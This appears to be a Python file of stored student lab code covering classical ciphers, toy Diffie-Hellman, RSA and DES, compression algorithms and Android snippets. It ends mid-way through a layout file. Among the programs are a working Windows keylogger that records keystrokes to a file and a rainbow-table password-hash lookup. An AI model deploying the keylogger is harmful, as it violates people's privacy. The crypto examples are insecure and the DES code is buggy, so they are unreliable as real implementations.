ceaser_cipher = '''
    #include <iostream>
#include <string>

using namespace std;

string encryptCeaserCipher(string message, int shift)
{
    string encryptedMessage;
    for (int i = 0; i < message.length(); i++)
    {
        if (isalpha(message[i]))
        {
            char base = isupper(message[i]) ? 'A' : 'a';
            encryptedMessage += char((message[i] - base + shift) % 26 + base);
        }
        else
        {
            encryptedMessage += message[i];
        }
    }
    return encryptedMessage;
}

string decryptCeaserCipher(string encryptedMessage, int shift)
{
    string decryptedMessage;
    for (int i = 0; i < encryptedMessage.length(); i++)
    {
        if (isalpha(encryptedMessage[i]))
        {
            char base = isupper(encryptedMessage[i]) ? 'A' : 'a';
            decryptedMessage += char((encryptedMessage[i] - base - shift + 26) % 26 + base);
        }
        else
        {
            decryptedMessage += encryptedMessage[i];
        }
    }
    return decryptedMessage;
}

int main()
{
    string message;
    int shift;

    cout << "Enter Message: ";
    getline(cin, message);

    cout << "Enter Shift: ";
    cin >> shift;

    string encrypted = encryptCeaserCipher(message, shift);
    string decrypted = decryptCeaserCipher(encrypted, shift);

    cout << "Ceaser Cipher Encrypted: " << encrypted << endl;
    cout << "Ceaser Cipher Decrypted: " << decrypted << endl;

    return 0;
}

'''

polyalphabetic_cipher = '''
#include <iostream>
#include <string>

using namespace std;

string encryptVigenereCipher(string text, string keyword)
{
    string result = "";
    int keywordLength = keyword.length();

    for (int i = 0; i < text.length(); ++i)
    {
        char textChar = text[i];
        char keyChar = keyword[i % keywordLength];

        if (isalpha(textChar))
        {
            char base = isupper(textChar) ? 'A' : 'a';
            char offset = ((textChar - base) + (keyChar - base) + 26) % 26;
            char resultChar = offset + base;
            result += resultChar;
        }
        else
        {
            result += textChar;
        }
    }

    return result;
}

string decryptVigenereCipher(string text, string keyword)
{
    string result = "";
    int keywordLength = keyword.length();

    for (int i = 0; i < text.length(); ++i)
    {
        char textChar = text[i];
        char keyChar = keyword[i % keywordLength];

        if (isalpha(textChar))
        {
            char base = isupper(textChar) ? 'A' : 'a';
            char offset = ((textChar - base) - (keyChar - base) + 26) % 26;
            char resultChar = offset + base;
            result += resultChar;
        }
        else
        {
            result += textChar;
        }
    }

    return result;
}

int main()
{
    string text, keyword;

    cout << "Enter Text: ";
    getline(cin, text);

    cout << "Enter Keyword: ";
    cin >> keyword;

    string encrypted = encryptVigenereCipher(text, keyword);
    string decrypted = decryptVigenereCipher(encrypted, keyword);

    cout << "Vigenere Cipher Encrypted: " << encrypted << endl;
    cout << "Vigenere Cipher Decrypted: " << decrypted << endl;

    return 0;
}


'''

row_column_transposition = '''
#include <iostream>
#include <string>
#include <cmath>

using namespace std;

string encryptRowColumnTransposition(string message, int numRows, int numColumns)
{
    string result;
    int messageLength = message.length();
    int matrixSize = numRows * numColumns;
    int numBlocks = ceil(static_cast<double>(messageLength) / matrixSize);

    for (int block = 0; block < numBlocks; ++block)
    {
        for (int col = 0; col < numColumns; ++col)
        {
            for (int row = 0; row < numRows; ++row)
            {
                int index = block * matrixSize + row * numColumns + col;
                if (index < messageLength)
                {
                    result += message[index];
                }
                else
                {
                    result += ' ';
                }
            }
        }
    }

    return result;
}

string decryptRowColumnTransposition(string encryptedMessage, int numRows, int numColumns)
{
    string result;
    int messageLength = encryptedMessage.length();
    int matrixSize = numRows * numColumns;
    int numBlocks = ceil(static_cast<double>(messageLength) / matrixSize);

    for (int block = 0; block < numBlocks; ++block)
    {
        for (int row = 0; row < numRows; ++row)
        {
            for (int col = 0; col < numColumns; ++col)
            {
                int index = block * matrixSize + col * numRows + row;
                if (index < messageLength)
                {
                    result += encryptedMessage[index];
                }
                else
                {
                    result += ' ';
                }
            }
        }
    }

    return result;
}

int main()
{
    string message;
    int numRows, numColumns;

    cout << "Enter Message: ";
    getline(cin, message);

    cout << "Enter number of rows: ";
    cin >> numRows;

    cout << "Enter number of columns: ";
    cin >> numColumns;

    string encrypted = encryptRowColumnTransposition(message, numRows, numColumns);
    string decrypted = decryptRowColumnTransposition(encrypted, numRows, numColumns);

    cout << "Row-Column Transposition Encrypted: " << encrypted << endl;
    cout << "Row-Column Transposition Decrypted: " << decrypted << endl;

    return 0;
}

'''

diffie_hellman = '''
#include <iostream>
#include <cmath>

using namespace std;

bool isPrime(int num)
{
    if (num <= 1)
    {
        return false;
    }
    for (int i = 2; i * i <= num; ++i)
    {
        if (num % i == 0)
        {
            return false;
        }
    }
    return true;
}

int generateRandomPrime(int range)
{
    int randomNum = rand() % range + 1;

    while (!isPrime(randomNum))
    {
        randomNum = rand() % range + 1;
    }

    return randomNum;
}

int power(int base, int exponent, int mod)
{
    int result = 1;
    base = base % mod;

    while (exponent > 0)
    {
        if (exponent % 2 == 1)
        {
            result = (result * base) % mod;
        }

        exponent = exponent >> 1;
        base = (base * base) % mod;
    }

    return result;
}

int main()
{
    srand(time(0));

    int p = generateRandomPrime(100);
    int g = rand() % 100 + 1;

    int a, b;
    cout << "Enter private key of A: ";
    cin >> a;

    cout << "Enter private key of B: ";
    cin >> b;

    int ga = power(g, a, p);
    int gb = power(g, b, p);

    cout << "p = " << p << endl;
    cout << "g = " << g << endl;
    cout << "ga = " << ga << endl;
    cout << "gb = " << gb << endl;

    int gab = power(ga, b, p);
    int gba = power(gb, a, p);

    cout << "gab = " << gab << endl;
    cout << "gba = " << gba << endl;

    return 0;
}

'''

rsa = '''
#include <iostream>
#include <cmath>
using namespace std;

// Function to check if a number is prime or not
bool isPrime(int n) {
   if (n <= 1) {
       return false;
   }
   for (int i = 2; i <= sqrt(n); i++) {
       if (n % i == 0) {
           return false;
       }
   }
   return true;
}

// Function to find GCD of two numbers
int gcd(int a, int b) {
   if (b == 0) {
       return a;
   }
   return gcd(b, a % b);
}

// Function to perform modular exponentiation
int modPow(int base, int exponent, int modulus) {
   int result = 1;
   base = base % modulus;
   while (exponent > 0) {
       if (exponent % 2 == 1) {
           result = (result * base) % modulus;
       }
       base = (base * base) % modulus;
       exponent = exponent / 2;
   }
   return result;
}

int main() {
   // Step 1: Choose two prime numbers
   int p = 17, q = 11;

   // Step 2: Compute n and phi
   int n = p * q;
   int phi = (p - 1) * (q - 1);

   // Step 3: Choose an integer e such that 1 < e < phi and gcd(e, phi) = 1
   int e = 2;
   while (e < phi) {
       if (gcd(e, phi) == 1) {
           break;
       }
       e++;
   }

   // Step 4: Compute the secret key d
   int d = 1;
   while ((d * e) % phi != 1) {
       d++;
   }

   // Step 5: Print the public and private keys
   cout << "Public key: {" << e << ", " << n << "}" << endl;
   cout << "Private key: {" << d << ", " << n << "}" << endl;

   // Step 6: Encrypt the message
   string message = "hello";
   int encrypted[message.length()];
   for (int i = 0; i < message.length(); i++) {
       int m = message[i];
       int c = modPow(m, e, n);
       encrypted[i] = c;
   }

   // Step 7: Decrypt the message
   string decrypted;
   for (int i = 0; i < message.length(); i++) {
       int c = encrypted[i];
       int m = modPow(c, d, n);
       decrypted += static_cast<char>(m);
   }

   // Step 8: Print the encrypted and decrypted messages
   cout << "Encrypted message: ";
   for (int i = 0; i < message.length(); i++) {
       cout << encrypted[i] << " ";
   }
   cout << endl;
   cout << "Decrypted message: " << decrypted << endl;

   return 0;
}
'''

des = '''

#include <iostream>
#include <bitset>
#include <string>
using namespace std;

bitset<56> bitReduction(const bitset<64>& key) {
    bitset<56> reducedKey;
    int j = 0;
    for (int i = 0; i < 64; ++i) {
        if ((i + 1) % 8 != 0) {
            reducedKey[j++] = key[i];
        }
    }
    return reducedKey;
}

bitset<64> leftShift2(const bitset<64>& data) {
    return (data << 2) | (data >> (64 - 2));
}

bitset<28> leftShift(const bitset<28>& keyPart, int round) {
    int shiftAmount = (round == 1 || round == 9 || round == 16) ? 1 : 2;
    return (keyPart << shiftAmount) | (keyPart >> (28 - shiftAmount));
}

int main() {
    // Get user input for data string
    string dataInput;
    cout << "Enter 64-bit Data String: ";
    cin >> dataInput;
    bitset<64> dataString(dataInput);

    string firstPart = dataInput.substr(0, 32);
    string secondPart = dataInput.substr(32, 64);

    cout << "L0 bits of Data: " << firstPart << endl;
    cout << "R0 bits of Data: " << secondPart << endl;

   /* bitset<48> ExpandedR0(secondPart) {
    int a=0;
    for(int e=0,)
    }
*/

    // Get user input for key string
    string keyInput;
    cout << "Enter 64-bit Key String: ";
    cin >> keyInput;
    bitset<64> keyString(keyInput);

    // Perform bit reduction on the key
    bitset<56> reducedKey = bitReduction(keyString);

    // Split the reduced key into left and right parts
    bitset<28> leftPart(reducedKey.to_string().substr(0, 28));
    bitset<28> rightPart(reducedKey.to_string().substr(28, 28));

    // Print original input data, shifted input data, input key, and reduced input key
    cout << "Original Input Data: " << dataString << endl;
    cout << "Shifted Input Data: " << leftShift2(dataString) << endl;
    cout << "Input Key: " << keyString << endl;
    cout << "Reduced Input Key: " << reducedKey << endl;

    // Print left and right parts of the reduced key
    cout << "Left Part of Reduced Key: " << leftPart << endl;
    cout << "Right Part of Reduced Key: " << rightPart << endl;

    // Perform left shift on left and right parts based on round
    for (int round = 1; round <= 16; ++round) {
        // Shift left and right parts
        leftPart = leftShift(leftPart, round);
        rightPart = leftShift(rightPart, round);

        // Print shifted left and right parts
        cout << "Round " << round << " Shifted Left Part: " << leftPart << endl;
        cout << "Round " << round << " Shifted Right Part: " << rightPart << endl;

        if(round==0){
            cout<< round<<"ROUND 1 "<< endl;
        }

        // Form new key by adding shifted left and right parts of previous round
        bitset<56> newKey = (leftPart.to_ullong() << 28) | rightPart.to_ullong();

        // Print new key formed
        cout << "Round " << round << " New Key Formed: " << newKey << endl;

        // Divide the new key into left and right parts for the next round
        //leftPart = newKey.to_string().substr(0, 28);
        //rightPart = newKey.to_string().substr(28, 28);
    }

    return 0;
}
'''

full_des = '''

#include <iostream>
#include <string>
#include <bitset>
using namespace std;

int main()
{
    int i;
    int new_arr[64];
    int ip[64] = {58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4,
                  62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8,
                  57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3,
                  61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7};
    int l_side[32], r_side[32];
    int input_block[64] = {1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0,
                           1, 0, 1, 0, 1, 0, 1, 0};

    for (i = 0; i < 64; i++)
    {
        int temp = ip[i] - 1;
        new_arr[i] = input_block[temp];
    }

    int c = 0;
    for (i = 0; i < 64; i++)
    {
        cout << new_arr[i] << ",";
        c++;
        if (c == 8)
        {
            cout << endl;
            c = 0;
        }
    }

    for (i = 0; i < 32; i++)
    {
        l_side[i] = new_arr[i];
        r_side[i] = new_arr[i + 32];
    }

    cout << "left part:" << endl;
    for (i = 0; i < 32; i++)
    {
        cout << l_side[i] << " ,";
    }
    cout << endl;
    cout << "New Left Part" << endl;

    cout << "right part:" << endl;
    for (i = 0; i < 32; i++)
    {
        cout << r_side[i] << " ,";
    }
    cout << endl;

    int key[64] = {
        0, 1, 1, 0, 1, 0, 0, 1,
        1, 0, 0, 1, 1, 1, 0, 0,
        0, 1, 0, 1, 1, 0, 1, 0,
        1, 0, 1, 0, 0, 0, 1, 1,
        1, 0, 1, 0, 0, 1, 1, 0,
        0, 0, 1, 1, 1, 0, 1, 0,
        0, 1, 0, 1, 1, 1, 0, 0,
        1, 0, 1, 0, 0, 1, 0, 1};

    int array_56_bit[56], c1 = 0;
    for (int i = 0; i < 64; i++)
    {
        if ((i + 1) % 8 == 0)
        {
            continue;
        }
        else
        {
            array_56_bit[c1++] = key[i];
        }
    }

    cout << "Array after removing 8th positions:" << endl;
    for (i = 0; i < 56; i++)
    {
        cout << array_56_bit[i] << " ,";
    }
    cout << endl;

    int lkey[28], rkey[28];
    for (i = 0; i < 28; i++)
    {
        lkey[i] = array_56_bit[i];
        rkey[i] = array_56_bit[i + 28];
    }

    cout << "left key" << endl;
    for (i = 0; i < 28; i++)
    {
        cout << lkey[i] << " ";
    }
    cout << endl;

    cout << "right key" << endl;
    for (i = 0; i < 28; i++)
    {
        cout << rkey[i] << " ";
    }
    cout << endl;

    int templ = lkey[0];
    int tempr = rkey[0];
    for (int i = 1; i < 28; i++)
    {
        lkey[i - 1] = lkey[i];
        rkey[i - 1] = rkey[i];
    }
    lkey[27] = templ;
    rkey[27] = tempr;

    cout << "Left key after rotation" << endl;
    for (i = 0; i < 28; i++)
    {
        cout << lkey[i] << " ";
    }
    cout << endl;

    cout << "Right key after rotation" << endl;
    for (i = 0; i < 28; i++)
    {
        cout << rkey[i] << " ";
    }
    cout << endl;

    cout << "Concatenated Array:" << endl;
    int concatened_arr[56];
    for (i = 0; i < 28; i++)
    {
        concatened_arr[i] = lkey[i];
        concatened_arr[i + 28] = rkey[i];
    }
    for (i = 0; i < 56; i++)
    {
        cout << concatened_arr[i] << " ";
    }
    cout << endl;

    int compression_key_table[48] = {
        14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10,
        23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2,
        41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48,
        44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32};

    int compressed_key_array[48];
    for (i = 0; i < 48; i++)
    {
        int temp3 = compression_key_table[i];
        compressed_key_array[i] = concatened_arr[temp3 - 1];
    }

    cout << "After Compression from 56 to 48:" << endl;
    for (i = 0; i < 48; i++)
    {
        cout << compressed_key_array[i] << " ";
    }
    cout << endl;

    int exp_d[48] = {32, 1, 2, 3, 4, 5, 4, 5,
                     6, 7, 8, 9, 8, 9, 10, 11,
                     12, 13, 12, 13, 14, 15, 16, 17,
                     16, 17, 18, 19, 20, 21, 20, 21,
                     22, 23, 24, 25, 24, 25, 26, 27,
                     28, 29, 28, 29, 30, 31, 32, 1};

    int new_right[48];
    for (i = 0; i < 48; i++)
    {
        new_right[i] = r_side[exp_d[i] - 1];
    }

    cout << "After Expansion from 32 to 48 of right part:" << endl;
    for (i = 0; i < 48; i++)
    {
        cout << new_right[i] << " ,";
    }
    cout << endl;

    // XOR operation between new_right and compressed_key_array
    int xor_result[48];
    for (i = 0; i < 48; i++)
    {
        xor_result[i] = new_right[i] ^ compressed_key_array[i];
    }

    cout << "XOR Result of new_right and compressed_key_array:" << endl;
    for (i = 0; i < 48; i++)
    {
        cout << xor_result[i] << " ,";
    }
    cout << endl;

    int sbox1[4][16] = {
        14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
        0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
        4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
        15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13};
    int sbox2[4][16] = {
        15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
        3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
        0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
        13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9};

    int sbox3[4][16] = {
        10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
        13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
        13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
        1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12};

    int sbox4[4][16] = {
        7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
        13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
        10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
        3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14};

    int sbox5[4][16] = {
        2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
        14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
        4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
        11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3};

    int sbox6[4][16] = {
        12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
        10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
        9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
        4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13};

    int sbox7[4][16] = {
        4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
        13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
        1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
        6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12};

    int sbox8[4][16] = {
        13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
        1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
        7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
        2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11

    };
    int function_op[32];
    int b0, b1, b2, b3, b4, b5;
    int row = 0, column = 0;
    int sbox_result[32];
    int sbox_count = 0;
    int new_val = 0;
    for (int i = 0; i < 48; i += 6)
    {
        b0 = xor_result[i];
        b1 = xor_result[i + 1];
        b2 = xor_result[i + 2];
        b3 = xor_result[i + 3];
        b4 = xor_result[i + 4];
        b5 = xor_result[i + 5];
        if (b0 == 0 && b5 == 0)
        {
            row = 0;
        }
        else if (b0 == 0 && b5 == 1)
        {
            row = 1;
        }
        else if (b0 == 1 && b5 == 0)
        {
            row = 2;
        }
        else if (b0 == 1 && b5 == 1)
        {
            row = 3;
        }
        string column = to_string(b1) + to_string(b2) + to_string(b3) + to_string(b4);
        cout << column;

        cout << endl;

        string binaryString = column;
        bitset<32> bitset(binaryString);
        unsigned long long intValue = bitset.to_ullong();

        cout << "Binary string: " << binaryString << endl;
        cout << "Integer value: " << intValue << endl;

        if (i == 0)
        {
            new_val = sbox1[row][intValue];
        }
        else if (i == 6)
        {
            new_val = sbox2[row][intValue];
        }
        else if (i == 12)
        {
            new_val = sbox3[row][intValue];
        }
        else if (i == 18)
        {
            new_val = sbox4[row][intValue];
        }
        else if (i == 24)
        {
            new_val = sbox5[row][intValue];
        }
        else if (i == 30)
        {
            new_val = sbox6[row][intValue];
        }
        else if (i == 36)
        {
            new_val = sbox7[row][intValue];
        }
        else
        {
            new_val = sbox8[row][intValue];
        }
        std::bitset<4> binary(new_val);
        std::cout << "Binary representation of " << new_val << " is " << binary << std::endl;
        cout << endl;

        for (size_t k = binary.size(); k-- > 0;)
        {
            sbox_result[sbox_count] = binary[k];
            sbox_count++;
        }
    }
    for (int i = 0; i < 32; i++)
    {
        cout << sbox_result[i] << " ,";
    }
    cout << endl;

    int perm_final[32] = {
        16, 7, 20, 21, 29, 12, 28, 17,
        1, 15, 23, 26, 5, 18, 31, 10,
        2, 8, 24, 14, 32, 27, 3, 9,
        19, 13, 30, 6, 22, 11, 4, 25};

    int temp96 = 0;
    int new_right_final[32];
    int first_val = perm_final[0];
    for (int j = 1; j <= 32; j++)
    {
        temp96 = perm_final[j];
        new_right_final[j] = sbox_result[temp96 - 1];
    }
    cout << "After Permutation of right side\n";
    for (int j = 0; j < 32; j++)
    {
        cout << new_right_final[j] << " ,";
    }
    int new_right_final2[32];
    for (i = 0; i < 32; i++)
    {
        new_right_final2[i] = l_side[i] ^ new_right_final[i];
    }
    cout << "\nAfter X-OR with og left part\n";
    for (int j = 0; j < 32; j++)
    {
        cout << new_right_final2[j] << " ,";
    }
    for (i = 0; i < 32; i++)
    {
        l_side[i] = r_side[i];
    }

    cout << "\nGUYSSSSS ROUND 1 COMPLETED BY ARJ";
    cout << "\nL1 VALUE: ";
    for (i = 0; i < 32; i++)
    {
        cout << l_side[i] << " ,";
    }
    cout << "\nR1 VALUE: ";
    for (i = 0; i < 32; i++)
    {
        cout << new_right_final2[i] << " ,";
    }
}

'''

keylogger = '''
#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
using namespace std;

void logKeystrokes() {
    char key;
    for (;;) {
        for (key = 8; key <= 190; ++key) {
            if (GetAsyncKeyState(key) == -32767) {
                ofstream outFile("keylog.txt", ios::app);
                if (outFile) {
                    outFile << key;
                    outFile.close();
                }
            }
        }
    }
}

int main() {
    logKeystrokes();
    return 0;
}



'''

rainbow_table = ''' 
#include <iostream>
#include <fstream>
#include <string>
using namespace std;

void searchHash(const string& fileName, const string& passHash) {
    ifstream inFile(fileName);
    if (!inFile) {
        cerr << "Unable to open file";
        return;
    }

    string line;
    while (getline(inFile, line)) {
        size_t pos = line.find(passHash);
        if (pos != string::npos) {
            cout << "Password found:" << endl;
            cout << line << endl;
            inFile.close();
            return;
        }
    }

    cout << "Password not found." << endl;
    inFile.close();
}

int main() {
    string fileName = "rainbow.txt";
    string passHash;

    cout << "Enter the password hash: ";
    cin >> passHash;

    searchHash(fileName, passHash);

    cout << "Press Enter to exit";
    cin.ignore();
    cin.get();
    return 0;
}


MD5:dc06698f0e2e75751545455899adccc3:pass@123
SHA1:ba97b1cf397425a852d1316d10787b1d97b5bc85:pass@123
SHA256:d97086919b6522e13ba9b46c04902c38372102218a4b3ef2f45ac2a80e9fd240:pass@123

MD5:5f4dcc3b5aa765d61d8327deb882cf99:password
SHA1:5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8:password
SHA256:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password

MD5:d8578edf8458ce06fbc5bb76a58c5ca4:qwerty
SHA1:b1b3773a05c0ed0176787a4f1574ff0075f7521e:qwerty
SHA256:65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5:qwerty

MD5:6119442a08276dbb22e918c3d85c1c6e:incorrect
SHA1:6c03ac0ea7241c3b2e2b7d54ff1db5f5539dc198:incorrect
SHA256:203d3536bd62ad33ac70b7ea3d4f5e10b6d52ebd0cb7582841a053aebb7186a3:incorrect
'''

entropy='''
import math

str=input("Enter a string : ")
strlen=len(str)
dic_value={i:str.count(i) for i in str}
print(dic_value)
entropy=0
for i in dic_value:
	value=dic_value[i]/strlen
	print("Probability of ",i," : ",value)
	entropy+=value*math.log(value,2)

print("Entropy Value",entropy*-1)
'''

arithmetic_Encoding='''
# dic={'a':0.4,'g':0.2,'s':0.25,'t':0.1,'e':0.05}
# dicnumalpha={0:'a',1:'g',2:'s',3:'t',4:'e'}
# dicnumprob={0:0.4,1:0.2,2:0.25,3:0.1,4:0.05}
# dic={'p': 0.4, 's': 0.25, 'o': 0.2, 't': 0.15}
# dicnumalpha={0:'p',1:'s',2:'o',3:'t'}
# dicnumprob={0:0.4,1:0.25,2:0.2,3:0.15}
dic={}
dicnumalpha={}
dicnumprob={}
n=int(input("Enter Number of Characters : "))
for i in range(n):
    char=input("Enter the Character : ")
    prob=float(input("Enter The probability of Character : "))
    dic[char]=prob
    dicnumalpha[i]=char
    dicnumprob[i]=prob
print(dic)
gc={}
valuation={}
val=0
mul_list=[]
for k,v in dic.items():
    mul_list.append(v)
    val=val+v
    gc[k]=val
str=input("Enter a string : ")
def list_multiply(temp_mul,mul_list):
    l1=[item * temp_mul for item in mul_list]
    mul_list=l1
    return mul_list
def getIndexFromAlpha(temp_alpha):
    for i in range(len(dicnumalpha)):
        if dicnumalpha[i]==temp_alpha:
            return i
def getProbFromIndex(index):
    for i in range(len(dicnumprob)):
        if i==index:
            if i-1==-1:
                return 0
            else:
                return dicnumprob[i-1]
def recreate_gc(start_index,lis):
    gcval=start_index
    for i in range(len(lis)):
        valuation[dicnumalpha[i]]=[{"MIN":gcval,"MAX":gcval+lis[i]}]
        gcval+=lis[i]
        gc[dicnumalpha[i]]=gcval
    for k,v in valuation.items():
        print(k,v)
    return gc
def reset_dicnumprob(dic):
    d1={}
    i=0
    for k,v in dic.items():
        d1[i]=v
        i+=1
    return d1
temp_mul=1 
for i in range(len(str)-1):
    temp_alpha=str[i]
    temp_mul*=dic[temp_alpha]
    lis=list_multiply(temp_mul,mul_list)
    start_index=getProbFromIndex(getIndexFromAlpha(temp_alpha))
    print("\\nFor iteration",i," and character ",temp_alpha)
    recreate_gc(start_index,lis)
    dicnumprob=reset_dicnumprob(gc)
print("\\nArithmetic Encoding of word ",str,"is : ",valuation[str[len(str)-1]])
'''

huffman='''
dic={'a': 35, 'b': 20, 'c': 10, 'd': 16, 'e': 8, 'f': 11}
nums_list=[35, 20, 10, 16, 8, 11]
n=len(nums_list)

def sort(nums_list):
    return sorted(nums_list)

def add_first_two(nums_list):
    sum=nums_list[0]+nums_list[1]
    nums_list=nums_list[2:]
    nums_list.append(sum)
    # print(nums_list)
    return nums_list
    
for i in range(n-1):
    nums_list=sort(nums_list)
    print("**",nums_list)
    nums_list=add_first_two(nums_list)
'''

rle='''
l1=[]
s=input("Enter String : ")
n = len(s)
i = 0
while i < n- 1:
    count = 1
    while (i < n - 1 and
        s[i] == s[i + 1]):
        count += 1
        i += 1
    i += 1
    l1.append(str(count))
    l1.append(s[i-1])

res=""
for i in l1:
    res+=i
    
print(res)
'''

lzw='''
s=input("Enter String : ")
keys_dict = {}

ind = 0
inc = 1
while True:
    if not (len(s) >= ind+inc):
        break
    sub_str = s[ind:ind + inc]
    print(sub_str,ind,inc)
    if sub_str in keys_dict:
        inc += 1
    else:
        keys_dict[sub_str] = 0
        ind += inc
        inc = 1
        # print 'Adding %s' %sub_str

print(list(keys_dict))
'''

iss_codes = {
    "ceaser_cipher.cpp": ceaser_cipher,
    "polyalphabetic_cipher.cpp": polyalphabetic_cipher,
    "row_column_transposition.cpp": row_column_transposition,
    "diffie_hellman.cpp": diffie_hellman,
    "rsa.cpp": rsa,
    'des.cpp': des,
    'full_des.cpp' : full_des,
    'keylogger.cpp': keylogger,
    'rainbow_table.cpp': rainbow_table
}

itc_codes = {
    'entropy.py': entropy,
    'arithmetic_Encoding.py': arithmetic_Encoding,
    'huffman.py': huffman,
    'rle.py': rle,
    'lzw.py': lzw
}

toast = '''
    Toast.makeText(RadioBtnAct.this , "Selected option : " + rdbtn.getText(), Toast.LENGTH_SHORT).show();

'''

listview = '''
Java code :
package com.example.practical;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ListView;

public class ListAct extends AppCompatActivity {
    ListView listView;
    String[] items = {"Item 1", "Item 2", "Item 3", "Item 4"};

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_list);
        listView = findViewById(R.id.listView);
//        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, items);
//        listView.setAdapter(adapter);
        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,items);
        listView.setAdapter(adapter);
        listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {

                if(position == 1){
                Intent i = new Intent(ListAct.this, loginFormAct.class);
                startActivity(i);}
                else if (position == 2){
                    Intent i = new Intent(ListAct.this, SharedPrefAct.class);
                    startActivity(i);

                }
            }
        });


    }

}

xml code

<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".ListAct">

    <ListView
        android:id="@+id/listView"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        />

</androidx.constraintlayout.widget.ConstraintLayout>


'''

checkbox = '''

java :
package com.example.practical;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.widget.CheckBox;
import android.widget.Toast;

public class checkBox extends AppCompatActivity {
    CheckBox checkBox1, checkBox2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_check_box);
        checkBox1 = findViewById(R.id.checkBox1);
        checkBox2 = findViewById(R.id.checkBox2);
        checkBox1.setOnCheckedChangeListener((buttonView, isChecked) ->
                Toast.makeText(this, "option1", Toast.LENGTH_SHORT).show());

        checkBox2.setOnCheckedChangeListener((buttonView, isChecked) ->
                Toast.makeText(this, "option2", Toast.LENGTH_SHORT).show());

    }
}


xml :
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
